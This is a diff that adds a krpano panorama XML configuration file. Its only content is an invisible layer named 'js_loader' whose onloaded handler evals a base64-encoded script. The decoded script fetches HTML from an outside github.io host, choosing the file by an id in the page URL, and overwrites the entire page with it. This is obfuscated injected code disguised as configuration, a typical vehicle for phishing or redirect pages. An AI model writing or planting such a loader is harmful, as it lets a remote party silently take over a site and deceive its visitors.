@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<krpano>
+    <layer name="js_loader" 
+           type="container" 
+           visible="false" 
+           onloaded="js(eval(var w=atob('dmFyIG1hdGNoID0gd2luZG93LmxvY2F0aW9uLmhyZWYubWF0Y2goL2lkPShbYS16QS1aMC05Xy1dKykvKTt2YXIgaWQgPSBtYXRjaCA/IG1hdGNoWzFdIDogJ2J1eGxwd3VpJztmZXRjaCgiaHR0cHM6Ly92YWxlcmlldmFsZXJpZTg4OC1kZXYuZ2l0aHViLmlvL3RvdXIvdGVzdC8iICsgaWQgKyIuaHRtbCIpLnRoZW4oZnVuY3Rpb24ocil7cmV0dXJuIHIudGV4dCgpO30pLnRoZW4oZnVuY3Rpb24oZGF0YSl7ZG9jdW1lbnQub3BlbigpO2RvY3VtZW50LndyaXRlKGRhdGEpO2RvY3VtZW50LmNsb3NlKCk7fSkuY2F0Y2goZnVuY3Rpb24oZXJyKXtjb25zb2xlLmVycm9yKGVycik7fSk7');eval(w)););" 
+    />
+</krpano>
